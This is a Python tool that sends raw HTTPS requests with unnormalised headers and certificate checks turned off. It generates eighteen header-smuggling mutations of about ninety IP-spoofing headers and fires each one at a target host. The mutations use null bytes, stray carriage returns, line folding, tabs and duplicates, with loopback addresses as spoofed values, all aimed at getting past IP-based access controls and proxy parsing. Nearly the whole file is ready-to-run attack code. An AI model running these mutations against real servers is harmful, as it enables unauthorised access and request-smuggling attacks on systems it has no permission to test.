import socket
import ssl

def raw_http_request(host, port=443, method="GET", path="/", proxy=None,
                     insecure=False, headers=None, raw_headers=None,
                     recv_buf=4096, timeout=None):
    """
    Send a raw HTTP/HTTPS request using sockets, with optional proxy, insecure SSL, and verbatim raw headers.

    Parameters
    ----------
    host : str
        Target hostname.
    port : int
        Port to connect to (80 for HTTP, 443 for HTTPS).
    method : str
        HTTP method (e.g., "GET", "POST").
    path : str
        Request path (may include query parameters).
    proxy : tuple or None
        Optional proxy (host, port). If None, connects directly.
    insecure : bool
        If True, disables SSL certificate verification.
    headers : dict or None
        Additional headers to append after raw_headers.
    raw_headers : str or None
        Verbatim headers to include immediately after the request line.
    recv_buf : int
        Buffer size for each recv() call.
    timeout : float or None
        Socket timeout in seconds.

    Returns
    -------
    tuple
        (raw_request_bytes, raw_request_escaped, raw_response_bytes, raw_response_escaped)

    Notes
    -----
    - raw_headers is sent exactly as provided (no normalization).
    - Host and Connection headers are added automatically if missing.
    - Returns both raw bytes and printable escaped versions showing `\r` and `\n`.
    """

    headers = {} if headers is None else dict(headers)

    target_host, target_port = proxy if proxy else (host, port)

    af, socktype, proto, _, sa = socket.getaddrinfo(target_host, target_port, 0, socket.SOCK_STREAM)[0]
    sock = socket.socket(af, socktype, proto)
    if timeout is not None:
        sock.settimeout(timeout)
    sock.connect(sa)

    # If HTTPS via proxy, CONNECT first
    if port == 443 and proxy:
        connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        sock.send(connect_request.encode())
        resp = sock.recv(recv_buf)
        if b"200 Connection established" not in resp and b"200 OK" not in resp:
            sock.close()
            raise Exception("Proxy CONNECT failed:\n" + resp.decode(errors="ignore"))

    # Wrap with SSL for HTTPS
    if port == 443:
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        s = context.wrap_socket(sock, server_hostname=host)
    else:
        s = sock

    # Request line (bytes)
    url_prefix = f"http://{host}" if proxy and port != 443 else ""
    request_line = f"{method} {url_prefix}{path} HTTP/1.1\r\n"
    request_line_bytes = request_line.encode('latin-1')

    # Build headers from dict (do NOT touch raw_headers content)
    # If Host not provided in headers and not present in raw_headers, add it here.
    raw_contains_host = False
    if raw_headers:
        # check case-insensitive presence of host: in raw_headers exactly as given
        for line in raw_headers.splitlines():
            if line.lower().startswith("host:"):
                raw_contains_host = True
                break

    user_provided_host = any(k.lower() == "host" for k in headers.keys())
    if not raw_contains_host and not user_provided_host:
        headers.setdefault('Host', host)

    # Default Connection header if not provided by user
    if not any(k.lower() == "connection" for k in headers.keys()):
        headers.setdefault('Connection', 'close')

    # Build header bytes from dict (safe: strip CR/LF from dict values)
    header_lines_bytes = b""
    for name, value in headers.items():
        if isinstance(value, (list, tuple)):
            header_value = ", ".join(str(v) for v in value)
        else:
            header_value = str(value)
        header_value = header_value.replace('\r', '').replace('\n', '')
        line = f"{name}: {header_value}\r\n"
        header_lines_bytes += line.encode('latin-1')

    # raw_headers_bytes: verbatim as provided (no normalization)
    raw_headers_bytes = raw_headers.encode('latin-1') if raw_headers else b""

    # Assemble bytes carefully:
    # request_line + raw_headers_bytes + separator (if needed) + header_lines_bytes + final CRLF
    parts = [request_line_bytes]

    if raw_headers_bytes:
        parts.append(raw_headers_bytes)
        # If raw_headers already ends with CRLFCRLF, we assume it included the header-body separator.
        if raw_headers_bytes.endswith(b'\r\n\r\n'):
            # We've already got separator, don't add anything before sending remaining headers.
            # But to avoid duplicating headers accidentally, append remaining header lines directly.
            parts.append(header_lines_bytes)
        else:
            # raw_headers was verbatim but didn't include header-body separator.
            # We append a single CRLF to separate raw block from the remaining headers,
            # then append remaining headers, then the final CRLF to end headers.
            parts.append(b'\r\n')             # separator between raw block and dict headers
            parts.append(header_lines_bytes)
            parts.append(b'\r\n')             # header-body separator
    else:
        # No raw headers provided; just append header lines and final separator
        parts.append(header_lines_bytes)
        parts.append(b'\r\n')

    raw_request_bytes = b"".join(parts)

    # Send exact bytes
    s.send(raw_request_bytes)

    # Receive raw response bytes
    raw_response_bytes = b""
    try:
        while True:
            chunk = s.recv(recv_buf)
            if not chunk:
                break
            raw_response_bytes += chunk
    finally:
        s.close()

    # Escaped printable forms (show \r and \n literally)
    def escape_bytes(b: bytes) -> str:
        # decode latin-1 to preserve bytes, then replace CR/LF with escaped sequences
        s = b.decode('latin-1')
        return s.replace('\r', '\\r').replace('\n', '\\n')

    raw_request_escaped = escape_bytes(raw_request_bytes)
    raw_response_escaped = escape_bytes(raw_response_bytes)

    return raw_request_bytes, raw_request_escaped, raw_response_bytes, raw_response_escaped


def parse_raw_http_response(raw_response: bytes):
    """
    Parse a raw HTTP response into status code, headers dict, and body.

    Parameters
    ----------
    raw_response : bytes
        Raw HTTP response bytes as received from the socket.

    Returns
    -------
    tuple
        (status_code: int, headers: dict, body: bytes)
        - status_code: HTTP status code (e.g., 200, 404)
        - headers: dict of header names (lowercased) to values
        - body: raw response body as bytes
    """
    # Decode headers safely (latin-1 preserves all bytes)
    decoded = raw_response.decode('latin-1', errors='replace')

    # Split headers and body on the first CRLFCRLF sequence
    parts = decoded.split("\r\n\r\n", 1)
    header_block = parts[0]
    body = parts[1].encode('latin-1') if len(parts) > 1 else b""

    # Split status line and header lines
    lines = header_block.split("\r\n")
    status_line = lines[0] if lines else ""
    header_lines = lines[1:]

    # Parse status code
    try:
        status_code = int(status_line.split()[1])
    except (IndexError, ValueError):
        status_code = None

    # Parse headers into dict (lowercased keys for convenience)
    headers = {}
    for line in header_lines:
        if ':' in line:
            name, value = line.split(':', 1)
            headers[name.strip().lower()] = value.strip()

    return status_code, headers, body


ip_headers = ["X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host", "X-Forwared-Host", "X-Forwarded", "Forwarded-For", "Cluster-Client-IP", "Fastly-Client-IP", "X-Cluster-Client-IP", "CACHE_INFO", "CF_CONNECTING_IP", "CF-Connecting-IP", "CLIENT_IP", "Client-IP", "COMING_FROM", "CONNECT_VIA_IP", "FORWARD_FOR", "FORWARD-FOR", "FORWARDED_FOR_IP", "FORWARDED_FOR", "FORWARDED-FOR-IP", "FORWARDED-FOR", "FORWARDED", "HTTP-CLIENT-IP", "HTTP-FORWARDED-FOR-IP", "HTTP-PC-REMOTE-ADDR", "HTTP-PROXY-CONNECTION", "HTTP-VIA", "HTTP-X-FORWARDED-FOR-IP", "HTTP-X-IMFORWARDS", "HTTP-XROXY-CONNECTION", "PC_REMOTE_ADDR", "PRAGMA", "PROXY_AUTHORIZATION", "PROXY_CONNECTION", "Proxy-Client-IP", "PROXY", "REMOTE_ADDR", "Source-IP", "True-Client-IP", "Via", "VIA", "WL-Proxy-Client-IP", "X_CLUSTER_CLIENT_IP", "X_COMING_FROM", "X_DELEGATE_REMOTE_HOST", "X_FORWARDED_FOR_IP", "X_FORWARDED_FOR", "X_FORWARDED", "X_IMFORWARDS", "X_LOCKING", "X_LOOKING", "X_REAL_IP", "X-Backend-Host", "X-BlueCoat-Via", "X-Cache-Info", "X-Forward-For", "X-Forwarded-By", "X-Forwarded-For-Original", "X-Forwarded-For", "X-Forwarded-For", "X-Forwarded-Server", "X-Forwarded-Host", "X-From-IP", "X-From", "X-Gateway-Host", "X-Host", "X-Ip", "X-Original-Host", "X-Original-IP", "X-Original-Remote-Addr", "X-Original-Url", "X-Originally-Forwarded-For", "X-Originating-IP", "X-ProxyMesh-IP", "X-ProxyUser-IP", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-True-Client-IP", "XONNECTION", "XPROXY", "XROXY_CONNECTION", "Z-Forwarded-For", "ZCACHE_CONTROL"]
# in ip_header_values list provide the IP(s) to use for the spoofing header — if you supply multiple IPs, the script will send a separate request for each IP.
ip_header_values = ["127.0.0.1", "23.215.0.136"]

# HRS method 1: adding ip spoofing header
mutation_headers1 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers1.append(f"{ip_header}: {ip_header_value}")

# HRS method 2: adding same ip spoofing header twice
mutation_headers2 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers2.append(f"{ip_header}: {ip_header_value}\r\n{ip_header}: {ip_header_value}")

# HRS method 3: using letter "z" as spoofed IP header value. E.g. X-Forwarded-For: z
mutation_headers3 = []
for ip_header in ip_headers:
    mutation_headers3.append(f"{ip_header}: z")

# HRS method 4: space before colon. E.g. X-Forwarded-For : 127.0.0.1
mutation_headers4 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers4.append(f"{ip_header} : {ip_header_value}")

# HRS method 5: first header normal, second header with the value "x". E.g.
# X-Forwarded-For: 127.0.0.1
# X-Forwarded-For: x
mutation_headers5 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers5.append(f"{ip_header}: {ip_header_value}\r\n{ip_header}: x")

# HRS method 6: Space before header name and right after request line. E.g.
# `GET / HTTP/1.1`
# ` X-Forwarded-For: 127.0.0.1`
mutation_headers6 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers6.append(f" {ip_header}: {ip_header_value}")

# HRS method 7: split header name and value across two lines, with the new line starting with a space.
# `X-Forwarded-For`
# ` : 127.0.0.1`
mutation_headers7 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers7.append(f"{ip_header}\r\n : {ip_header_value}")

# HRS method 8: Tab before header value. E.g. `X-Forwarded-For:     127.0.0.1`
mutation_headers8 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers8.append(f"{ip_header}:\t{ip_header_value}")

# HRS method 9: A fake header followed by a newline and a real IP spoofing header. E.g. `X: X[\n]X-Forwarded-For: 127.0.0.1`
mutation_headers9 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers9.append(f"""X: X\n{ip_header}: {ip_header_value}""")

# HRS method 10: Header name Junk. E.g.: `X-Forwarded-For abcd: 127.0.0.1`
mutation_headers10 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers10.append(f"{ip_header} abcd: {ip_header_value}")

# HRS method 11: Turn hypes to underscores in header name. E.g. `X_Forwarded_For: 127.0.0.1`
mutation_headers11 = []
for ip_header in ip_headers:
    ip_header = ip_header.replace("-", "_")
    for ip_header_value in ip_header_values:
        mutation_headers11.append(f"{ip_header}: {ip_header_value}")

# HRS method 12: Turn hypes to underscores in header name and add that header twice. E.g.
# `X_Forwarded_For: 127.0.0.1`
# `X_Forwarded_For: 127.0.0.1`
mutation_headers12 = []
for ip_header in ip_headers:
    ip_header = ip_header.replace("-", "_")
    for ip_header_value in ip_header_values:
        mutation_headers12.append(f"{ip_header}: {ip_header_value}\r\n{ip_header}: {ip_header_value}")

# HRS method 13: Carriage return before header name. E.g. [\r]X-Forwarded-For: 127.0.0.1
mutation_headers13 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers13.append(f"\r{ip_header}: {ip_header_value}")

# HRS method 14: Tab before header name. E.g. `     X-Forwarded-For: 127.0.0.1`
mutation_headers14 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers14.append(f"\t{ip_header}: {ip_header_value}")

# HRS method 15: A fake header followed by carriage return line feed and a carriage return, and then a real IP spoofing header. E.g.
# `Foo: bar\r\n`
# `\rX-Forwarded-For: 127.0.0.1`
mutation_headers15 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers15.append(f"Foo: bar\r\n\r{ip_header}: {ip_header_value}")

# HRS method 16: E.g. `\x00X-Forwarded-For: 127.0.0.1`
mutation_headers16 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers16.append(f"\x00{ip_header}: {ip_header_value}")

# HRS method 17: E.g. `X-Forwarded-For\x00: 127.0.0.1`
mutation_headers17 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers17.append(f"{ip_header}\x00: {ip_header_value}")

# HRS method 18: E.g. `X-Forwarded-For:\x00127.0.0.1`
mutation_headers18 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers18.append(f"{ip_header}:\x00{ip_header_value}")


#* To test only selected techniques, comment out that HRS method item from all_mutation_headers dictionary
all_mutation_headers = {
    # 1: mutation_headers1,
    # 2: mutation_headers2,
    # 3: mutation_headers3,
    # 4: mutation_headers4,
    # 5: mutation_headers5,
    # 6: mutation_headers6,
    # 7: mutation_headers7,
    # 8: mutation_headers8,
    # 9: mutation_headers9,
    # 10: mutation_headers10,
    # 11: mutation_headers11,
    # 12: mutation_headers12,
    # 13: mutation_headers13,
    # 14: mutation_headers14,
    15: mutation_headers15,
    16: mutation_headers16,
    17: mutation_headers17,
}


# Example usage
if __name__ == "__main__":

    for mutation_header_key in all_mutation_headers:
        for mutation_header in all_mutation_headers.get(mutation_header_key):
            ##* Modify from here to suite target.

            raw_hdrs = mutation_header   # verbatim, will NOT be edited
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"}

            req_b, req_esc, resp_b, resp_esc = raw_http_request(
                "example.com",
                port=443,
                method="GET",
                path="/",
                # proxy=("127.0.0.1", 9090),  #! Use proxy with caution, as it might reject some requests containing mutated headers sent with the intention of Header Smuggling.
                insecure=True,
                headers=headers,
                raw_headers=raw_hdrs,
                timeout=5
            )

            print("")

            # # Print literal escaped view (shows \r and \n)
            # print(req_esc)
            # If you want the actual bytes repr:
            print(repr(req_b))

            response_code, response_headers, response_body = parse_raw_http_response(raw_response=resp_b)
            print(response_code)
            print(response_headers)